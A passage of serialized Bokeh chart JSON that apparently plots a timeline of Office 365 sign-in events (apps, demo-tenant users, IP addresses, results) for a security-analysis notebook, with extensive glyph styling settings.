"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2933\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2944\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2605\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2606\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2607\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"pAEAAKgBAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"O365 Suite UX\",\"O365 Suite UX\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"unPWs9+KeUK6c9az34p5Qg==\"},\"shape\":[2],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"BQAAAAUAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2945\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2946\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2941\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2942\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2943\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2954\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2608\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2609\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2610\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"QQAAAGAAAACxAQAAuwEAADUCAABeAgAA\"},\"shape\":[6],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Office 365 Exchange Online\",\"Office 365 Exchange Online\",\"Office 365 Exchange Online\",\"Office 365 Exchange Online\",\"Office 365 Exchange Online\",\"Office 365 Exchange Online\"],\"shape\":[6],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[6],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\"],\"shape\":[6],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[6],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"umPuI+eKeUK6Y+4j54p5QrqDEcffinlCuoMRx9+KeUK6s1rLyop5QrqzWsvKinlC\"},\"shape\":[6],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"BgAAAAYAAAAGAAAABgAAAAYAAAAGAAAA\"},\"shape\":[6],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2955\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2956\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2951\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2952\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2953\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2964\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2611\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2612\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2613\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"SQAAAEoAAADMAQAAzwEAAA==\"},\"shape\":[4],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Office 365 SharePoint Online\",\"Office 365 SharePoint Online\",\"Office 365 SharePoint Online\",\"Office 365 SharePoint Online\"],\"shape\":[4],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[4],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Failed\",\"Failed\",\"Sucess\",\"Sucess\"],\"shape\":[4],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"136.55.145.135\",\"136.55.145.135\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[4],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"uhNu4NqKeUK6E27g2op5QrozmIviinlCujOYi+KKeUI=\"},\"shape\":[4],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"BwAAAAcAAAAHAAAABwAAAA==\"},\"shape\":[4],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2965\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2966\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2961\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2962\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2963\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2974\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2614\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2615\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2616\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"agAAAKoAAAC5AAAAwQAAANkAAADaAAAA4QAAAPAAAAA9AQAAWgEAAF4BAACyAQAAtQEAALYBAAC3AQAA0AEAANEBAADSAQAA1AEAANYBAADbAQAAMgIAADMCAAA0AgAANgIAAGMCAACSAgAAoAIAAKQCAACsAgAAsgIAALUCAADAAgAA\"},\"shape\":[33],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\"],\"shape\":[33],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"demo@seccxp.ninja\",\"seb@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[33],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\"],\"shape\":[33],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"73.35.204.105\",\"109.88.218.99\",\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[33],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"uuMoJOeKeUK6YyHLyop5QrpzKiTninlCuvP1I+eKeUK6k3TL34p5QrqTdMvfinlCuuMoJOeKeUK6cyok54p5QrrjEpDiinlCuoOhiuKKeUK604+K4op5QrpTgsrfinlCulOCyt+KeUK6cw3L34p5QrpzDcvfinlCuoOhiuKKeUK64xKQ4op5QrrDFYriinlCutOPiuKKeUK686CK4op5QrrzoIriinlCugN5y8qKeUK6w3TLyop5QrpjIcvKinlCugN5y8qKeUK6wxWK4op5QrrDdMvKinlCunPjYtCKeUK6U/Fi0Ip5QrpDi2LQinlCunPjYtCKeUK6U/Fi0Ip5QrpDi2LQinlC\"},\"shape\":[33],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"CAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAA\"},\"shape\":[33],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2975\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2976\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2971\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2972\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2973\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2984\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2617\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2618\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2619\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"zQEAANgBAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"SharePoint Online Web Client Extensibility\",\"SharePoint Online Web Client Extensibility\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"utPxjuKKeUK60/GO4op5Qg==\"},\"shape\":[2],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"CQAAAAkAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2985\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2986\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2981\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2982\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2983\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#5BC862\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2994\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2620\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2621\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2622\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"9wAAADcBAABgAQAAYQEAALMBAAC0AQAAvgEAANMBAADVAQAA1wEAAN0BAAA=\"},\"shape\":[11],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\"],\"shape\":[11],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[11],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\"],\"shape\":[11],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[11],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"utNFzN+KeUK6Y8rL34p5Qrpj14riinlCugMei+KKeUK6A77K34p5QroDvsrfinlCumPKy9+KeUK6Y9eK4op5QrozWYriinlCujNZiuKKeUK6Ax6L4op5Qg==\"},\"shape\":[11],\"dtype\":\"float64\",\"order\":\"li